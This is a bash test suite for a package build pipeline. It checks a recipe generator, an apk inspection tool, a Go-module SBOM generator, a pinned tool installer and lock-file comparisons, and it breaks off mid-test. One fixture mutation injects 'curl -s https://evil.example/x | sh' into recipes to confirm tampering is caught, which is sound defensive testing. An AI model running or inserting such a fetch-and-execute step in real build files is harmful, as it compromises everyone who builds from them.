#!/usr/bin/env bash
# proves: REQ-SBOM-001-AC1, REQ-SBOM-001-AC2, REQ-SBOM-001-AC3, REQ-SBOM-001-AC4, REQ-SBOM-001-AC5, REQ-BUILDTOOLS-001-AC1, REQ-BUILDTOOLS-001-AC2, REQ-BUILDTOOLS-001-AC3, REQ-BUILDTOOLS-001-AC4, REQ-BUILDTOOLS-001-AC5, REQ-BUILDTOOLS-001-AC6, REQ-BUILDTOOLS-001-AC7, REQ-BUILDTOOLS-001-AC8, REQ-BUILDTOOLS-001-AC9, REQ-BUILDTOOLS-001-AC10, REQ-SUP-001-AC18
# Tests of the PR: helpers: module SBOM tool, apk tool, recipe compare, tool installer, lock tool.
# Split mechanically from the original suite: the sections between the markers are copied byte for byte, the harness is
# bin/melange-apko-lib.sh. Every assertion runs offline against PATH stubs; nothing here calls a real sudo, sysctl,
# unshare, melange or apko (the harness refuses to run on a non-Linux host unless the stubs are in front).
. "$(cd "$(dirname "$0")" && pwd)/melange-apko-lib.sh"
NONROOT="p['SPDXID']!='SPDXRef-fscache'"      # a module package of a go-module-sbom document: not the root
# ---- begin verbatim sections ----
# ===== rule 21: bin/gen-recipes.py (both recipes are generated from one template; CI checks the committed files are exactly its output) =================
gt="$fx/melange.yaml.tmpl"; ga="$fx/melange.yaml"; gb="$fx/melange-fips.yaml"
GRD="--melange-lock $fx/melange.lock --fips-module $fx/fips-module.txt"   # the fixture data files
GR_PROD="$GR"; GR="$fx/gen-recipes.py"; GRX=env   # the fixtures run a copy of the generator whose TEMPLATE_SHA256 line holds the fixture template's own pin (the real one is checked in build-apk-test.sh)
t "rule 21" "gen-recipes --check passes on a pair the generator wrote" $GRX python3 "$GR" $GRD --template "$gt" --regular "$ga" --fips "$gb" --check
t "rule 21" "the pair differs ONLY in the name, the description and the FIPS lines (the whole diff, character for character)" bash -c "d=\$(diff '$ga' '$gb' | grep '^[<>]' | sed 's/^[<>] //' | sort); e=\$(printf '%s\n' '  name: fscache' '  name: fscache-fips' '  description: the cache server' '  description: the cache server, built with the Go FIPS 140-3 module' '      export GOFIPS140=v1.0.0' '      go version -m \${{targets.destdir}}/usr/bin/fscache > /tmp/fscache-gobuildinfo.txt' \"      grep -q 'GOFIPS140=v1.0.0-c2097c7c' /tmp/fscache-gobuildinfo.txt\" | sort); test \"\$d\" = \"\$e\""
t "rule 21" "the standard recipe holds no GOFIPS140 at all" bash -c "! grep -q GOFIPS140 '$ga'"
t "rule 21" "the FIPS proof reads a file, not a pipe (no SIGPIPE under pipefail)" bash -c "grep -q 'go version -m .* > /tmp/fscache-gobuildinfo.txt' '$gb' && ! grep -q 'fscache | grep' '$gb'"
gr=$(mktemp -d "$work/gr.XXXXXX"); mv "$gr" "$work/gr"   # this file's own scratch, made by mktemp; kept at the fixed name the fixture lines use
variant() { cp "$ga" "$work/gr/a.yaml"; cp "$gb" "$work/gr/b.yaml"; }
chk() { $GRX python3 "$GR" $GRD --template "$gt" --regular "$work/gr/a.yaml" --fips "$work/gr/b.yaml" --check; }
variant; printf '  - runs: echo extra-step\n' >>"$work/gr/b.yaml"
fails "rule 21" "gen-recipes: an extra pipeline step in the FIPS recipe is a difference and the diff shows it" 'extra-step' chk
variant; sed -i.bak 's/GOFLAGS: -mod=vendor/GOFLAGS: -mod=mod/' "$work/gr/a.yaml"
fails "rule 21" "gen-recipes: a different GOFLAGS in the standard recipe fails and names it" 'GOFLAGS' chk
variant; sed -i.bak 's/GOTOOLCHAIN: local/GOTOOLCHAIN: auto/' "$work/gr/b.yaml"
fails "rule 21" "gen-recipes: a different GOTOOLCHAIN fails and names it" 'GOTOOLCHAIN' chk
variant; python3 - "$work/gr/a.yaml" <<'P2'
import re, sys
p = sys.argv[1]; s = open(p).read(); s = re.sub(r"expected-sha256: [0-9a-f]+", "expected-sha256: 0000", s, count=1); open(p, "w").write(s)
P2
fails "rule 21" "gen-recipes: a different Go checksum fails and names it" 'expected-sha256' chk
variant; sed -i.bak 's/export GOFIPS140=v1.0.0/export GOFIPS140=v1.0.1/' "$work/gr/b.yaml"
fails "rule 21" "gen-recipes: the FIPS setting with another version than the constant is a difference" 'GOFIPS140' chk
variant; sed -i.bak 's/c2097c7c/c2097c7d/' "$work/gr/b.yaml"
fails "rule 21" "gen-recipes: the proof with another hash is a difference" 'c2097c7' chk
variant; python3 - "$work/gr/b.yaml" <<'P'
import sys
p = sys.argv[1]; s = open(p).read().replace("GOFIPS140=v1.0.0", "GOFIPS140=v1.0.٠")
open(p, "w").write(s)
P
fails "rule 21" "gen-recipes: a non-ASCII digit in the setting line is a difference" 'GOFIPS140' chk
variant; printf '      export GOFIPS140=v1.0.0\n' >>"$work/gr/a.yaml"
fails "rule 21" "gen-recipes: a GOFIPS140 line added to the STANDARD recipe is a difference" 'GOFIPS140' chk
# the property the old parsed comparison could not give: the SAME change in both files is still a difference from the generator's output
for n in same-step same-tag same-null same-uses; do variant
  case $n in
    same-step) printf '  - runs: |\n      curl -s https://evil.example/x | sh\n' | tee -a "$work/gr/a.yaml" >>"$work/gr/b.yaml";;
    same-tag) sed -i.bak 's/GOTOOLCHAIN: local/!!binary R09FWFBFUklNRU5U: jsonv2\n    GOTOOLCHAIN: local/' "$work/gr/a.yaml" "$work/gr/b.yaml";;
    same-null) printf '  - uses: fetch\n    with:\n      expected-none: null\n' | tee -a "$work/gr/a.yaml" >>"$work/gr/b.yaml";;
    same-uses) printf '  - uses: go/build\n    with:\n      packages: ./cmd/fscache\n' | tee -a "$work/gr/a.yaml" >>"$work/gr/b.yaml";;
  esac
  fails "rule 21" "gen-recipes: the identical change ($n) in BOTH committed recipes is refused: they are not the generator's output" 'generator' chk
done
variant; printf '\n' >>"$work/gr/a.yaml"
fails "rule 21" "gen-recipes: a trailing newline more is a difference (byte for byte)" 'generator' chk
variant; sed -i.bak '1s/^/#/' "$work/gr/b.yaml"
fails "rule 21" "gen-recipes: a changed comment is a difference too" 'generator' chk
rm -f "$work/gr/b.yaml"
t "rule 21" "gen-recipes: a missing committed file exits 2 naming it" bash -c "$GRX python3 '$GR' $GRD --template '$gt' --regular '$work/gr/a.yaml' --fips '$work/gr/b.yaml' --check >'$work/gr/out' 2>&1; test \$? = 2 && grep -q 'b.yaml' '$work/gr/out'"
# the template's own rules
tmpl() { cp "$gt" "$work/gr/t.tmpl"; }
trule() { $GRX python3 "$GR" $GRD --template "$work/gr/t.tmpl" --regular "$ga" --fips "$gb" --check; }
tmpl; printf '# GOFIPS140 in a comment\n' >>"$work/gr/t.tmpl"
fails "rule 21" "gen-recipes: a template that mentions GOFIPS140 is refused by the template rule itself (the FIPS lines are the generator's constants)" 'template .*mentions GOFIPS140' trule
tmpl; printf '\tx: 1\n' >>"$work/gr/t.tmpl"
fails "rule 21" "gen-recipes: a tab in the template is refused" 'tab' trule
tmpl; printf 'x: 1\r\n' >>"$work/gr/t.tmpl"
fails "rule 21" "gen-recipes: a carriage return in the template is refused" 'carriage' trule
tmpl; printf 'x: 1\0\n' >>"$work/gr/t.tmpl"
fails "rule 21" "gen-recipes: a NUL byte in the template is refused" 'NUL' trule
tmpl; printf 'x: @OTHER@\n' >>"$work/gr/t.tmpl"
fails "rule 21" "gen-recipes: a placeholder outside the named set is refused" 'OTHER' trule
tmpl; printf 'y: @NAME@\n' >>"$work/gr/t.tmpl"
fails "rule 21" "gen-recipes: a placeholder used twice is refused" 'exactly once' trule
tmpl; sed -i.bak 's/^@FIPS_EXPORT@$/x @FIPS_EXPORT@/' "$work/gr/t.tmpl"
fails "rule 21" "gen-recipes: FIPS_EXPORT not alone on its line is refused" 'alone' trule
tmpl; printf '\377\376' >>"$work/gr/t.tmpl"
fails "rule 21" "gen-recipes: a template that is not UTF-8 is refused" 'UTF-8' trule
t "rule 21" "gen-recipes: the version placeholder is left for build-apk.sh (the generated recipes still hold @VERSION@ once)" bash -c "test \"\$(grep -c '@VERSION@' '$ga')\" = 1 && test \"\$(grep -c '@VERSION@' '$gb')\" = 1"
t "rule 21" "gen-recipes --write then --check on a scratch pair passes" bash -c "cp '$gt' '$work/gr/w.tmpl' && $GRX python3 '$GR' $GRD --template '$work/gr/w.tmpl' --regular '$work/gr/w1.yaml' --fips '$work/gr/w2.yaml' --write && $GRX python3 '$GR' $GRD --template '$work/gr/w.tmpl' --regular '$work/gr/w1.yaml' --fips '$work/gr/w2.yaml' --check"

# ===== rules 14 20 22: apk-tool.py, go-module-sbom.py, release-sign-apks.sh =============================================
pr="$fx/pair"
t "rule 22" "apk-tool digest prints sha256:<hex> of the control and data sections" bash -c "python3 '$AT' digest '$pr/a.apk' | grep -Eq '^sha256:[0-9a-f]{64}\$'"
t "rule 22" "apk-tool same: equal contents with different signatures are the same (control and data, signature ignored)" python3 "$AT" same "$pr/a.apk" "$pr/b.apk"
fails "rule 22" "apk-tool same: an apk with different contents differs (exit non-zero, names it)" 'c\.apk' python3 "$AT" same "$pr/a.apk" "$pr/c.apk"
t "rule 22" "apk-tool same: an unsigned apk with the same contents is the same" python3 "$AT" same "$pr/a.apk" "$pr/unsigned.apk"
t "rule 22" "apk-tool signer: assembly" bash -c "test \"\$(python3 '$AT' signer '$pr/a.apk')\" = assembly.rsa.pub"
t "rule 22" "apk-tool signer: release" bash -c "test \"\$(python3 '$AT' signer '$pr/b.apk')\" = release.rsa.pub"
t "rule 22" "apk-tool signer: a real melange apk names its signature .SIGN.RSA256.<key>; the key name is still assembly.rsa.pub" bash -c "test \"\$(python3 '$AT' signer '$pr/rsa256.apk')\" = assembly.rsa.pub"
t "rule 22" "apk-tool signer: unsigned" bash -c "test \"\$(python3 '$AT' signer '$pr/unsigned.apk')\" = unsigned"
t "rule 14" "apk-tool binary-check: the binary file equals usr/bin/fscache in the apk" python3 "$AT" binary-check "$pr/a.apk" "$pr/binA"
fails "rule 14" "apk-tool binary-check: a different binary fails and prints the digests" '[0-9a-f]{64}' python3 "$AT" binary-check "$pr/a.apk" "$pr/binC"
t "rule 14" "apk-tool binary-check: an apk without usr/bin/fscache is refused (exit 2)" bash -c "python3 '$AT' binary-check '$pr/nobin.apk' '$pr/binA' >'$work/o' 2>&1; test \$? -eq 2 && grep -q 'usr/bin/fscache' '$work/o'"
t "rule 14" "apk-tool cat extracts usr/bin/fscache bytes" bash -c "test \"\$(python3 '$AT' cat '$pr/a.apk' usr/bin/fscache)\" = binA"
t "rule 15" "apk-tool inputs-manifest: environment read back from the apk equals the melange lock -> manifest written" bash -c "python3 '$AT' inputs-manifest --apk '$pr/inputs.apk' --melange-lock '$fx/melange.lock' --out '$work/im.json' && grep -q 'busybox=1.37.0-r5' '$work/im.json'"
fails "rule 15" "apk-tool inputs-manifest: a package in the apk's environment that is not in the lock fails and names it" 'bash' python3 "$AT" inputs-manifest --apk "$pr/inputs-bad.apk" --melange-lock "$fx/melange.lock" --out "$work/im2.json"
sb="$fx/sbom"
gsa=(--modules "$sb/modules.txt" --provenance "$sb/prov-unbuilt.json")
t "rule 20" "go-module-sbom: every embedded module is vendored and in dependency-provenance.json -> SPDX JSON listing the embedded modules" bash -c "python3 '$GS' ${gsa[*]} --buildinfo '$sb/ok.txt' --out '$work/m1.json' && python3 -c \"
import json; d=json.load(open('$work/m1.json')); n={(p['name'],p.get('versionInfo')) for p in d['packages']}
assert n >= {('github.com/example/x','v1.0.0'),('golang.org/x/sys','v0.30.0')}, n\""
t "rule 20" "go-module-sbom: a vendored-but-unbuilt module (example.org/unbuilt) is NOT in the SBOM and does not fail it" bash -c "python3 '$GS' ${gsa[*]} --buildinfo '$sb/ok.txt' --out '$work/m1b.json' && ! grep -q 'example.org/unbuilt' '$work/m1b.json' && grep -q 'github.com/example/x' '$work/m1b.json'"
t "rule 20" "go-module-sbom: a vendored module absent from the binary's list (golang.org/x/sys not built) does not fail" bash -c "python3 '$GS' ${gsa[*]} --buildinfo '$sb/missing.txt' --out '$work/m5.json' && ! grep -q 'golang.org/x/sys' '$work/m5.json'"
t "rule 20" "go-module-sbom: deterministic (two runs, same bytes)" bash -c "python3 '$GS' ${gsa[*]} --buildinfo '$sb/ok.txt' --out '$work/m2.json' && cmp '$work/m1.json' '$work/m2.json'"
fails "rule 20" "go-module-sbom: a module the binary embeds that is not in vendor/modules.txt fails and names it" 'example\.org/evil' python3 "$GS" "${gsa[@]}" --buildinfo "$sb/extra.txt" --out "$work/m3.json"
fails "rule 20" "go-module-sbom: an embedded module in vendor/modules.txt but NOT in dependency-provenance.json fails and names it" 'golang\.org/x/sys' python3 "$GS" --modules "$sb/modules.txt" --provenance "$sb/provenance-nosys.json" --buildinfo "$sb/ok.txt" --out "$work/m3b.json"
fails "rule 20" "go-module-sbom: a version that differs from vendor/modules.txt fails and names the module" 'golang\.org/x/sys' python3 "$GS" "${gsa[@]}" --buildinfo "$sb/ver.txt" --out "$work/m4.json"
t "rule 20" "go-module-sbom: compares path and version only (the vendor-mode binary list has no hashes)" bash -c "python3 '$GS' ${gsa[*]} --buildinfo '$sb/ok.txt' --out '$work/m6.json'"
# 0707 fix 3 (NTIA minimum elements): the root package and its supplier, DESCRIBES, DEPENDS_ON each module,
# the creators, the fixed created time
python3 "$GS" "${gsa[@]}" --buildinfo "$sb/ok.txt" --name fscache-fips --version 0.3.0 --out "$work/m7.json"
# melange v0.61.2 pkg/sbom/package.go:182-183 writes the supplier as "Organization: " + Title(namespace), so the
# namespace fosterstack reads "Organization: Fosterstack"; the root package here must carry the same string
SUPPLIER="Organization: Fosterstack"; export SUPPLIER
t "0707-fix3" "go-module-sbom: the root package is the shipped package, with its supplier, apk version and purl" \
  python3 - "$work/m7.json" <<'PY'
import json, os, sys
SUPPLIER = os.environ["SUPPLIER"]
d = json.load(open(sys.argv[1])); r = [p for p in d["packages"] if p["SPDXID"] == "SPDXRef-fscache"]
assert len(r) == 1, r
r = r[0]
assert r["name"] == "fscache-fips" and r["versionInfo"] == "0.3.0-r0" and r["supplier"] == SUPPLIER, r
assert r["externalRefs"][0]["referenceLocator"] == "pkg:apk/fosterstack/fscache-fips@0.3.0-r0", r
PY
t "0707-fix3" "go-module-sbom: the document DESCRIBES the root; the root DEPENDS_ON every module once, nothing else" \
  python3 - "$work/m7.json" <<'PY'
import json, sys
d = json.load(open(sys.argv[1])); rel = d["relationships"]
mods = sorted(p["SPDXID"] for p in d["packages"] if p["SPDXID"] != "SPDXRef-fscache")
assert mods, "no modules"
assert rel[0] == {"spdxElementId": "SPDXRef-DOCUMENT", "relationshipType": "DESCRIBES",
                  "relatedSpdxElement": "SPDXRef-fscache"}, rel[0]
assert sorted(r["relatedSpdxElement"] for r in rel[1:]) == mods, rel
assert all(r["spdxElementId"] == "SPDXRef-fscache" and r["relationshipType"] == "DEPENDS_ON" for r in rel[1:]), rel
PY
t "0707-fix3" "go-module-sbom: the creators are the organization and the tool; the created time is the fixed epoch" \
  python3 - "$work/m7.json" <<'PY'
import json, sys
c = json.load(open(sys.argv[1]))["creationInfo"]
assert c == {"created": "1970-01-01T00:00:00Z", "creators": ["Organization: Fosterstack", "Tool: go-module-sbom"]}, c
PY
t "0707-fix3" "go-module-sbom: without --version the root has no version and no purl; the supplier is still named" \
  python3 - "$work/m1.json" <<'PY'
import json, sys
r = [p for p in json.load(open(sys.argv[1]))["packages"] if p["SPDXID"] == "SPDXRef-fscache"][0]
assert "versionInfo" not in r and "externalRefs" not in r, r
assert r["supplier"] == "Organization: Fosterstack" and r["name"] == "fscache", r
PY
t "0707-fix3" "go-module-sbom: deterministic with --name and --version too" \
  bash -c "python3 '$GS' ${gsa[*]} --buildinfo '$sb/ok.txt' --name fscache-fips --version 0.3.0 \
    --out '$work/m8.json' && cmp '$work/m7.json' '$work/m8.json'"
t "0707-fix3" "go-module-sbom: an apk release-candidate version (0.3.0_rc1, with an underscore) is accepted" \
  python3 "$GS" "${gsa[@]}" --buildinfo "$sb/ok.txt" --version 0.3.0_rc1 --out "$work/m10.json"
fails "0707-fix3" "go-module-sbom: a --name that is not a plain package-name word is refused" \
  'plain package-name' python3 "$GS" "${gsa[@]}" --buildinfo "$sb/ok.txt" --name 'a b' --out "$work/m9.json"
fails "0707-fix3" "go-module-sbom: there is no --epoch option (the recipes say epoch: 0)" 'unrecognized arguments' \
  python3 "$GS" "${gsa[@]}" --buildinfo "$sb/ok.txt" --version 0.3.0 --epoch 1 --out "$work/m9.json"
for bad in FSCACHE a/b a@b; do
  fails "0707-fix3" "go-module-sbom: --name $bad is refused (lower-case package-name words only)" 'plain package-name' \
    python3 "$GS" "${gsa[@]}" --buildinfo "$sb/ok.txt" --name "$bad" --out "$work/m9.json"
done
for bad in 0.3.0+meta 0.3.0-r1; do
  fails "0707-fix3" "go-module-sbom: --version $bad is refused (digits, dots and underscores only)" \
    'plain package-name' \
    python3 "$GS" "${gsa[@]}" --buildinfo "$sb/ok.txt" --version "$bad" --out "$work/m9.json"
done
for v in 0.3.0 0.3.0-rc1 0.0.0-rc.1; do
  av=$(python3 -I -B "$root/bin/build-apk-helper.py" arg apkver --version "$v")
  t "0707-fix3" "go-module-sbom: the apk form $av of the driver's version $v is accepted" \
    python3 "$GS" "${gsa[@]}" --buildinfo "$sb/ok.txt" --version "$av" --out "$work/m11.json"
done
# SPDX 2.3: one document namespace URI per document, so each package and version names its own
python3 "$GS" "${gsa[@]}" --buildinfo "$sb/ok.txt" --name fscache --version 0.3.0 --out "$work/m12.json"
t "0707-fix3" "go-module-sbom: the fscache and fscache-fips documents have different documentNamespace values" \
  python3 - "$work/m12.json" "$work/m7.json" <<'PY'
import json, sys
a, b = (json.load(open(f))["documentNamespace"] for f in sys.argv[1:3])
base = "https://fosterstack.invalid/spdx/go-modules/"
assert a == base + "fscache@0.3.0-r0" and b == base + "fscache-fips@0.3.0-r0", (a, b)
PY
t "0707-fix3" "go-module-sbom: without --version the documentNamespace names only the package" \
  python3 - "$work/m1.json" <<'PY'
import json, sys
ns = json.load(open(sys.argv[1]))["documentNamespace"]
assert ns == "https://fosterstack.invalid/spdx/go-modules/fscache", ns
PY
t "0707-fix3" "go-module-sbom: the root version is VERSION-r0" python3 - "$work/m7.json" <<'PY'
import json, sys
r = [p for p in json.load(open(sys.argv[1]))["packages"] if p["SPDXID"] == "SPDXRef-fscache"][0]
assert r["versionInfo"] == "0.3.0-r0", r
PY
t "0707-fix3" "go-module-sbom: a module package names no supplier (the binary's module list has none): NOASSERTION" \
  python3 - "$work/m7.json" <<'PY'
import json, sys
mods = [p for p in json.load(open(sys.argv[1]))["packages"] if p["SPDXID"] != "SPDXRef-fscache"]
assert mods and all(p["supplier"] == "NOASSERTION" for p in mods), mods
PY
fails "0707-fix3" "go-module-sbom: a --version with a slash is refused (it goes into a purl)" \
  'plain package-name' python3 "$GS" "${gsa[@]}" --buildinfo "$sb/ok.txt" --version '1/2' --out "$work/m9.json"
# ===== rule 16: installing melange and apko on the VM ===================================================================
t "rule 16" "install-build-tools.sh pins a version and a sha256 per tool and arch, verifies before extracting, no container digest" y pins "$IT"
sf "rule 16" "unknown tool refused" 'unknown' "$IT" bogus "$work/bin"
sf "rule 16" "unsupported architecture refused" 'arch' env FAKE_UNAME=riscv64 "$IT" melange "$work/bin"
for tool in melange apko; do
  rm -rf "$work/bin-$tool"
  sf "rule 16" "$tool: a download whose sha256 differs from the pin fails, labeled" 'sha256|checksum' env FAKE_UNAME=x86_64 STUB_CURL_BOGUS=1 "$IT" $tool "$work/bin-$tool"
  t "rule 16" "$tool: after the failed check nothing is installed" bash -c "test -f '$IT' && test ! -e '$work/bin-$tool/$tool'"
  for um in x86_64:amd64 aarch64:arm64; do
    sf "rule 16" "$tool ${um#*:}: a bogus download is refused" 'sha256 mismatch' env FAKE_UNAME=${um%%:*} STUB_CURL_BOGUS=1 "$IT" $tool "$work/bin-$tool"
    t "REQ-SUP-001-AC18" "$tool ${um#*:}: the installer fetched exactly its literal release asset, once" bash -c "test \$(grep -Ec -- ' -o [^ ]+/${tool}_[0-9.]+_linux_${um#*:}\.tar\.gz [^ ]+/chainguard-dev/$tool/releases/download/v[0-9.]+/${tool}_[0-9.]+_linux_${um#*:}\.tar\.gz\$' '$CALLS') = 1 && test \$(wc -l <'$CALLS') = 1"
  done
done
# REQ-SUP-001-AC18: every tool download in install-build-tools.sh is a literal command carrying its exact release version and the
# sha256 it is verified against, so the pin-age check measures it like any pin (the real inventory's reading of the file is tested in the
# pin-age check's own tests). This text names no downloader word and no release address of its own (the pin checks read this file too).
cat >"$work/ibt.py" <<'PY'
import re, sys
DL = re.compile(r"\b(?:cu)rl\b|\bwg(?:et)\b")
HOST = "https://github" + ".com/"
TOOLS = {"melange": "chainguard-dev/melange", "apko": "chainguard-dev/apko"}
ARCHES = ("amd64", "arm64")
def die(msg):
    print("install-build-tools: " + msg); sys.exit(1)
def struct(path):
    text = open(path).read(); lines = text.split("\n"); seen = {}; vers = {}
    for n, ln in enumerate(lines, 1):
        if not DL.search(ln):
            continue
        lab = re.match(r"^\s*([a-z0-9]+)-([a-z0-9]+)\)\s", ln)
        if not lab or lab.group(1) not in TOOLS or lab.group(2) not in ARCHES:
            die("line %d downloads outside a tool-arch branch: %s" % (n, ln.strip()))
        tool, arch = lab.groups()
        links = re.findall(r"https?://[^\s'\"]+", ln)
        if len(links) != 1:
            die("line %d (%s-%s) must carry exactly one release address, found %d" % (n, tool, arch, len(links)))
        link = links[0]
        if "$" in link or "`" in link:
            die("line %d (%s-%s): the release address is not literal: %s" % (n, tool, arch, link))
        m = re.fullmatch(re.escape(HOST) + r"([\w.-]+/[\w.-]+)/releases/download/v(\d+\.\d+\.\d+)/([\w.-]+)", link)
        if not m:
            die("line %d (%s-%s): not a literal release address with an exact vX.Y.Z version: %s" % (n, tool, arch, link))
        repo, ver, asset = m.groups()
        if repo != TOOLS[tool]:
            die("line %d: %s downloads from %s, not %s" % (n, tool, repo, TOOLS[tool]))
        if asset != "%s_%s_linux_%s.tar.gz" % (tool, ver, arch):
            die("line %d (%s-%s): the asset %s does not match the version v%s of its address" % (n, tool, arch, asset, ver))
        p = re.search(r"\bpinned\s+(\S+?)(?:\s+([0-9a-f]{64}))?\s*;", ln)
        if not p or not p.group(2):
            die("line %d (%s-%s): no sha256 is verified on the download line (pinned <version> <sha256>)" % (n, tool, arch))
        if p.group(1) != ver:
            die("line %d (%s-%s): the checksum is pinned for version %s but the address downloads v%s: the versions do not match" % (n, tool, arch, p.group(1), ver))
        if (tool, arch) in seen:
            die("%s-%s has two download lines (%d and %d)" % (tool, arch, seen[(tool, arch)], n))
        seen[(tool, arch)] = n
        if vers.setdefault(tool, ver) != ver:
            die("%s is pinned at two versions (%s and %s)" % (tool, vers[tool], ver))
        if text.count(p.group(2)) != 1:
            die("the sha256 of %s-%s appears %d times: it must be written once, on its download line" % (tool, arch, text.count(p.group(2))))
    missing = sorted("%s-%s" % (t, a) for t in TOOLS for a in ARCHES if (t, a) not in seen)
    if missing:
        die("missing a download line for: " + ", ".join(missing))
    for n, ln in enumerate(lines, 1):
        if n in seen.values():
            continue
        if re.search(r"(?<![0-9a-f])[0-9a-f]{64}(?![0-9a-f])", ln):
            die("line %d holds a sha256 outside the download lines (a second source that could drift)" % n)
        for tool, ver in sorted(vers.items()):
            if ver in ln:
                die("line %d repeats the %s version %s outside its download lines (a second source that could drift)" % (n, tool, ver))
        if re.search(r"\bpinned\s+\S", ln) and not ln.lstrip().startswith("#"):
            die("line %d calls pinned outside a download line" % n)
    print("ok: " + ", ".join("%s v%s" % kv for kv in sorted(vers.items())))
def mutate(src, out, kind):
    lines = open(src).read().split("\n")
    def edit(label, rx, rep):
        for i, ln in enumerate(lines):
            if re.match(r"^\s*%s\)" % re.escape(label), ln):
                new, k = re.subn(rx, rep, ln, count=1)
                if k == 1:
                    lines[i] = new; return
        print("mutant %s did not apply" % kind); sys.exit(3)
    if kind == "variable":
        edit("melange-amd64", r"/download/v[^/]+/", "/download/v$ver/")
    elif kind == "repovar":
        edit("apko-amd64", re.escape(HOST) + r"[\w.-]+/[\w.-]+/", lambda m: HOST + "$repo/")
    elif kind == "mismatch":
        edit("apko-arm64", r"/download/v(\d+)\.(\d+)\.(\d+)/apko_\d+\.\d+\.\d+_", lambda m: "/download/v{0}.{1}.{2}/apko_{0}.{1}.{2}_".format(m.group(1), m.group(2), int(m.group(3)) + 1))
    elif kind == "nosum":
        edit("melange-arm64", r"\s+[0-9a-f]{64}", "")
    elif kind == "noline":
        idx = [i for i, ln in enumerate(lines) if re.match(r"^\s*apko-amd64\)", ln)]
        if len(idx) != 1:
            print("mutant noline did not apply"); sys.exit(3)
        del lines[idx[0]]
    elif kind == "table":
        m = re.search(r"/download/v(\d+\.\d+\.\d+)/apko_", "\n".join(lines))
        if not m:
            print("mutant table did not apply"); sys.exit(3)
        lines.insert(1, "APKO_VERSION=" + m.group(1))
    else:
        print("unknown mutant " + kind); sys.exit(2)
    open(out, "w").write("\n".join(lines))
{"struct": lambda: struct(sys.argv[2]), "mutate": lambda: mutate(sys.argv[2], sys.argv[3], sys.argv[4])}[sys.argv[1]]()
PY
ibt() { python3 "$work/ibt.py" "$@"; }
t "REQ-SUP-001-AC18" "install-build-tools.sh: every download line is a literal release address with an exact vX.Y.Z, its asset and its sha256 on the same line, one per tool and arch" ibt struct "$IT"
for mut in "variable:not literal" "repovar:not literal" "mismatch:versions do not match" "nosum:no sha256" "noline:missing a download line for: apko-amd64" "table:repeats the apko version"; do
  kind=${mut%%:*} kw=${mut#*:}
  fails "REQ-SUP-001-AC18" "install-build-tools structure: the $kind mutant is refused" "$kw" bash -c "python3 '$work/ibt.py' mutate '$IT' '$work/ibt-$kind.sh' $kind && python3 '$work/ibt.py' struct '$work/ibt-$kind.sh'"
done

# ===== apko-lock.sh: compare / arch-check / verify-archive / evidence (rules 28 29 33 37) ================================
BL="$fx/base.lock.json" FL="$fx/full.lock.json"
t "rule 37" "compare: full lock = base + our apk (reordered, other urls, other config checksum) -> equal" "$LK" compare "$BL" "$FL" --apk fscache
python3 "$work/lib.py" mutate "$FL" "$work/f-urls.json" urls-only
t "rule 37" "compare: ignores url and config checksum (package entries only)" "$LK" compare "$BL" "$work/f-urls.json" --apk fscache
python3 "$work/lib.py" mutate "$FL" "$work/f-sum.json" datasum tzdata
fails "rule 37" "compare: a changed checksum fails and names the package" 'tzdata' "$LK" compare "$BL" "$work/f-sum.json" --apk fscache
python3 "$work/lib.py" mutate "$FL" "$work/f-extra.json" extra bash
fails "rule 37" "compare: an extra package in the full lock fails and names it" 'bash' "$LK" compare "$BL" "$work/f-extra.json" --apk fscache
python3 "$work/lib.py" mutate "$FL" "$work/f-drop.json" drop tzdata
fails "rule 37" "compare: a base package missing from the full lock fails and names it" 'tzdata' "$LK" compare "$BL" "$work/f-drop.json" --apk fscache
python3 "$work/lib.py" mutate "$FL" "$work/f-noapk.json" drop fscache
fails "rule 37" "compare: a full lock without our apk fails and names it" 'fscache' "$LK" compare "$BL" "$work/f-noapk.json" --apk fscache
python3 "$work/lib.py" mutate "$FL" "$work/f-oneapk.json" dropone fscache
fails "rule 37" "compare: our apk present for one arch only fails and names the arch" 'aarch64' "$LK" compare "$BL" "$work/f-oneapk.json" --apk fscache
t "rule 37" "compare: a base lock that already holds our apk is refused (exit 2)" bash -c "'$LK' compare '$FL' '$FL' --apk fscache >/dev/null 2>&1; test \$? -eq 2"
t "rule 33" "arch-check: both archs resolve the same versions -> pass" "$LK" arch-check "$BL"
python3 "$work/lib.py" mutate "$BL" "$work/b-arch.json" archver
fails "rule 33" "arch-check: a package whose version differs between archs fails and names it" 'tzdata' "$LK" arch-check "$work/b-arch.json"
t "rule 28" "verify-archive: every package of the base lock is in the archive with matching control and data checksums" "$LK" verify-archive --lock "$BL" --archive "$fx/archive"
t "rule 28" "verify-archive: the full lock verifies against archive + melange repo" "$LK" verify-archive --lock "$FL" --archive "$fx/archive" --melange-repo "$fx/melrepo"
rm -rf "$work/arch-t"; cp -R "$fx/archive" "$work/arch-t"; python3 "$work/lib.py" tamper "$work/arch-t/x86_64/tzdata-2026a-r0.apk"
fails "rule 28" "verify-archive: a tampered package fails at the lock checksum and is named" 'tzdata-2026a-r0\.apk' "$LK" verify-archive --lock "$BL" --archive "$work/arch-t"
rm -rf "$work/arch-m"; cp -R "$fx/archive" "$work/arch-m"; rm -f "$work/arch-m/aarch64/tzdata-2026a-r0.apk"
fails "rule 27" "verify-archive: a package missing from the archive fails and is named" 'tzdata' "$LK" verify-archive --lock "$BL" --archive "$work/arch-m"
rm -rf "$work/arch-i"; cp -R "$fx/archive" "$work/arch-i"; rm -f "$work/arch-i/x86_64/APKINDEX.tar.gz"
fails "rule 27" "verify-archive: a missing APKINDEX fails and names it" 'APKINDEX' "$LK" verify-archive --lock "$BL" --archive "$work/arch-i"
ev="$work/evidence"; mkdir -p "$ev"
t "rule 29" "evidence: writes the lock, a sha256 list of every archived package, the indexes, the Wolfi key and the Go tarballs" bash -c "'$LK' evidence --lock '$BL' --archive '$fx/archive' --out '$ev' && ls '$ev'/*.lock.json >/dev/null && f='$ev/archive-checksums.txt' && test -s \"\$f\" && grep -q 'tzdata-2026a-r0.apk' \"\$f\" && grep -q 'x86_64/APKINDEX.tar.gz' \"\$f\" && grep -q 'aarch64/APKINDEX.tar.gz' \"\$f\" && grep -q 'wolfi-signing.rsa.pub' \"\$f\" && grep -q 'go1.27.2.linux-amd64.tar.gz' \"\$f\""
t "rule 29" "evidence: the listed sha256 values are correct (sha256sum -c style, run from the archive)" bash -c "f='$ev/archive-checksums.txt'; cd '$fx/archive' && while read -r h p; do p=\${p#\\*}; printf '%s  %s\n' \"\$h\" \"\$p\"; done <\"\$f\" | python3 -c \"
import hashlib, sys
n = 0
for l in sys.stdin:
    h, p = l.rstrip('\n').split('  ', 1)
